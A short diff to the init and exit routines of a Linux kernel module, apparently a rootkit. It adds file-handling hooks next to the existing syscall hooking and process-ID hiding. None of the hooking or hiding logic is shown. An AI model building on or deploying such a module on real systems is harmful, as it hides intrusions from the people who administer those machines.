@@ -1,6 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include "hooks.h"
+#include "file.h"
 #include "process.h"
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Bot-wxt1221");
@@ -9,6 +10,7 @@ MODULE_VERSION("0.01");
 
 static int __init lkm_example_init(void){
   printk(KERN_INFO "Hello!");
+  init_file();
   my_hook_syscall();
   return 0;
 }
@@ -16,6 +18,7 @@ static int __init lkm_example_init(void){
 static void __exit lkm_example_exit(void){
   printk(KERN_INFO "Hello!2");
   recover_hide_pid_all();
+  exit_file();
   my_unregister_hook_syscall();
   return ;
 }
